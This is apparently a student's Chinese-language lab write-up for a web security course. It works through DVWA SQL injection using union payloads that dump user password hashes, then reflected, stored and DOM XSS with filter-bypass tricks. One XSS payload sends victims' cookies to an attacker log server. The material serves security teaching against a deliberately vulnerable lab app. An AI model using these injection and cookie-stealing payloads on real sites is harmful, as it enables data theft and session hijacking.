# Web 期末实训

## SQL 注入

### 初级

①启动测试环境（XAMPP+DVWA),设置SQL手工注入安全等级，进入初级测试页面



②在UserID文本框输入不同内容，测试页面的回显信息

![image-20250625110620743](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625110620743.png)

![image-20250625110627952](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625110627952.png)



③判断注入类型是数字型注入还是字符型注入

```
' and 1 = 1 #
```

![image-20250625111427582](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625111427582.png)

提交后无回显，说明是字符型



④获取查询语句的字段数，以便进行联合查询

```
1' or 1 = 1 union select 1,2 #
```

![image-20250625114626225](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625114626225.png)



⑤获取数据库名、数据表名、字段名

数据库名

```
1' or 1 = 1 union select 'info',schema_name FROM information_schema.SCHEMATA # 
```

 ![image-20250625143902407](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625143902407.png)



数据库中的表名

```
1' or 1 = 1 union select 'info',table_name FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'dvwa' #
```

![image-20250625143628349](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625143628349.png)



表中的字段

```
1' or 1 = 1 union select 'info',column_name FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND table_name = 'users'#
```

![image-20250625143751301](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625143751301.png)



⑥密码解答

```
1' or 1 = 1 union select user,password FROM dvwa.users #
```

![image-20250625144013574](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625144013574.png)



### 中级

①源代码分析，并测试正常业务功能

 

②设置浏览器和BurpSuite的代理参数

 ![image-20250625144255877](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625144255877.png)

![image-20250625144309172](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625144309172.png)



③抓取请求数据包，修改id参数值，测试页面的回显信息

 ![image-20250625144519662](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625144519662.png)

![image-20250625144450263](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625144450263.png)



④判断注入类型是数字型还是字符型注入

字符型

```
1'
```

![image-20250625145305913](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625145305913.png)



⑤获取查询语句的字段数，以便进行联合查询

 ![image-20250625145409819](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625145409819.png)



⑥获取数据库名、数据表名、字段名

 数据库名

```
1' or 1 = 1 union select 'info',schema_name FROM information_schema.SCHEMATA # 
```

![image-20250625145627360](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625145627360.png)



数据表名

```
0' union select 'info',table_name FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'dvwa' #
```

![image-20250625145848390](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625145848390.png)



字段名

```
0' union select 'info',column_name FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND table_name = 'users'#
```

![image-20250625145924939](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625145924939.png)



⑦获取字段对应数据

```
0' union select user,password FROM dvwa.users #
```

![image-20250625150017130](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625150017130.png)



⑧密码解密

```
https://www.cmd5.com/default.aspx
```

![image-20250625150300880](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625150300880.png)



### 高级

在 DVWA SQL 注入 的高级模式下，系统会打开一个新的页面。在新的页面输入内容后，旧的页面会刷新，并且查询的结果会出现在旧的页面。

![image-20250625153608394](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625153608394.png)



在 DVWA（Damn Vulnerable Web Application）的 SQL 注入高级别挑战中，当你在新打开的页面中输入内容并提交后，父页面会刷新并显示查询结果。这通常利用了 JavaScript 的窗口操作技术。



当点击“Submit”或类似按钮时，会创建一个新的弹出窗口，该窗口通常由父窗口通过 JavaScript 的 **window.open()** 方法创建。

通过这种方式创建的弹出窗口（子窗口），可以使用 **window.opener** 对象来引用其父窗口。



由于子窗口中的 JavaScript 执行了 `window.opener.location.reload(true);`，父窗口（`/dvwa/vulnerabilities/sqli/`）被强制刷新，向服务器发起一个新的 HTTP GET 请求。

当服务器处理这个父窗口的 HTTP GET 请求时，会执行与该页面关联的 PHP 代码。PHP 脚本从会话中读取之前存储的 id 值。它使用这个从会话中检索到的 id 来构建 SQL 查询，执行查询，并将结果呈现在刷新后的父窗口页面上。



在子窗口（`session-input.php`）中输入 ID 并点击提交时，会向服务器发送一个 **POST 请求** 并传入查询参数。需注意：服务器端**不会在本次 POST 请求的响应中直接返回数据库查询结果**，而是将 ID 值存储到服务器端的**会话（$_SESSION）**变量中。

提交后子窗口重新加载时，服务器返回的新页面包含以下关键代码： `<script>window.opener.location.reload(true);</script>`浏览器解析执行该脚本，**强制刷新父窗口**。



由于子窗口执行了 `window.opener.location.reload(true);`，父窗口（`/dvwa/vulnerabilities/sqli/`）会**重新发起 HTTP GET 请求**。

服务器处理父窗口的 GET 请求时：

1. 执行关联的 PHP 脚本
2. 从 **$_SESSION** 中读取存储的 ID
3. 用该 ID **构建并执行 SQL 查询**
4. 将查询结果**显示在刷新后的父页面上**



使用 Burp Suite 软件进行抓包。在浏览器中执行一次查询操作后，在 Burp Suite 中将捕获到的**子窗口 HTTP 请求**和**父窗口 HTTP 请求**分别发送到 **Repeater 模块**。

1. 首先，在**子窗口 HTTP 请求的 Repeater 标签页**中填写所需参数，发送 HTTP 请求。
2. 待收到服务器响应后，**切换到父窗口 HTTP 请求的 Repeater 标签页**，发送一次 HTTP 请求。
3. 此时，在父窗口 HTTP 请求的响应中，将会包含查询的结果。

![image-20250625160306483](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625160306483.png)

![image-20250625160359091](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625160359091.png)



## SQL 盲注

略，根本不会考



## XSS

### 反射型

#### 简单

②插入恶意Javascript脚本进行测试，页面弹窗显示Cookie值

```
<script>alert(document.cookie);</script>
```

![image-20250625170820637](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625170820637.png)

![image-20250625170828036](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625170828036.png)



③攻击者远程获取Cookie

搭建一个 http log 服务器，使用 php 实现，核心代码。

![image-20250625174113327](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625174113327.png)



启动服务器

![image-20250625174153457](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625174153457.png)



访问 url，测试 http log 服务器是否有用

![image-20250625174248564](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625174248564.png)



查看 php 服务端中记录的内容

![image-20250625174329187](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625174329187.png)



在反射型 XSS 利用点使用以下代码即可获得 cookie

```
admin<script>new Image().src="http://192.168.200.1/log/index.php?cookie="+document.cookie;</script>
```

![image-20250625174456130](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625174456130.png)



提交后

![image-20250625174507482](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625174507482.png)



服务端记录

![image-20250625174522180](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250625174522180.png)



#### 中等

有过滤 

③大小写绕过或双写绕过中级反射型XSS渗透测试环境的防护

大小写绕过

```
<Script>alert(document.cookie);</Script>
```



双写绕过

```
<scrscriptipt>alert(document.cookie);</scrscriptipt>
```

```
<scr script ipt>alert(document.cookie);</scr script ipt>
```



#### 高级

标签绕过高级反射型XSS渗透测试环境的防护

```php
<?php
header ("X-XSS-Protection: 0"); // 明确禁用XSS保护头部
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // 核心防护：正则替换 'script'
    // Feedback for end user
    echo "<pre>Hello {$name}</pre>"; // 反射点：直接将处理后的 $name 输出到 HTML
}
?>
```

这个正则表达式旨在移除`script`关键字。我们的目标是找到一种方式来执行JavaScript，但又不包含完整的`script`关键字。



利用不包含 "script" 关键字的事件处理函数

`<img>` 标签 + `onerror` 事件

```
<img src=x onerror=alert(1)>
```



`<iframe>` 标签 + onload 事件

```
<iframe onload=alert(1)>
```



`<body>` 标签 + `onload` 事件 (如果可以控制整个body)

```
<body onload=alert(1)>
```



`<svg>` 标签 + onload 事件

```
<svg onload=alert(1)>
```



### 存储型

存储型 XSS (Stored XSS)，也称为 **持久型 XSS (Persistent XSS)**，**恶意脚本被永久地存储在目标服务器上，并在后续用户访问时被自动执行。**

攻击者找到一个允许用户输入数据并将其存储到服务器（如数据库）的应用程序功能点。攻击者在这些输入框中输入包含恶意 JavaScript 代码的数据，应用程序未能对输入进行充分的验证和过滤恶意内容，导致恶意脚本被当作普通数据存储到服务器的数据库中。



当其他无辜的用户（受害者）访问包含这些存储数据的页面时（例如，查看攻击者发布的评论、浏览攻击者创建的论坛帖子）：

- 服务器从数据库中检索包含恶意脚本的数据。
- 服务器将这些数据嵌入到 HTML 响应中，发送给受害者的浏览器。
- 受害者的浏览器接收到 HTML 响应后，会解析并执行其中的 JavaScript 代码。由于恶意脚本现在是页面内容的一部分，浏览器会将其视为合法脚本并执行。



#### 低级

留言板中写入 JavaScript 代码，无过滤，会直接提交到后端数据库中存储。

```
<script>alert(document.cookie);</script>
```

![image-20250626104242290](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250626104242290.png)



#### 中级

姓名框仅存在简单过滤，可以使用大小写混合绕过。

姓名框存在字符长度限制，这是 HTML 属性的限制，可以 F12 修改 HTML 标签属性删除限制

```
<Script>alert(document.cookie);</Script>
```

![image-20250626105042894](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250626105042894.png)

![image-20250626105107953](./images/web%E6%9C%9F%E6%9C%AB%E5%AE%9E%E8%AE%AD.assets/image-20250626105107953.png)



#### 高级

存在长度限制，修改 HTML 属性绕过。

利用不包含 "script" 关键字的事件处理函数

`<img>` 标签 + `onerror` 事件

```
<img src=x onerror=alert(1)>
```





### DOM 型

DOM 型 XSS（也称为 Type-0 XSS）是一种客户端跨站脚本攻击，与传统的反射型（Reflected XSS）和存储型（Stored XSS）不同，其攻击点在于客户端的 DOM（Document Object Model，文档对象模型），而不是服务器端的 HTTP 响应。攻击者通过操控客户端 JavaScript 代码，利用用户输入（通常来自 URL 参数、锚点或 DOM 对象）在浏览器中动态修改页面内容，从而执行恶意脚本。



恶意代码不直接出现在服务器返回的 HTML 响应中，而是通过客户端 JavaScript 动态写入 DOM。

攻击通常依赖于 URL 中的参数（如 location.search、location.hash）或其他 DOM 对象（如 document.referrer）。

由于恶意代码不会发送到服务器，传统的服务器端过滤（如 WAF）可能无法检测到 DOM 型 XSS，隐蔽性较强。

攻击效果仅在受害者浏览器中生效，通常通过社交工程（如诱导点击恶意链接）触发。



#### 简单

DVWA 的 DOM 型 XSS 页面允许用户通过下拉菜单选择语言（如 English、French 等），选择后会在 URL 中添加 default 参数，例如：

```
http://localhost/dvwa/vulnerabilities/xss_d/?default=English
```

JavaScript 代码从 URL 的 default 参数中提取值，并直接写入 DOM。

漏洞点：页面通过 JavaScript（如 document.write 或 innerHTML）直接将 default 参数的值写入 DOM，没有任何输入验证或过滤。

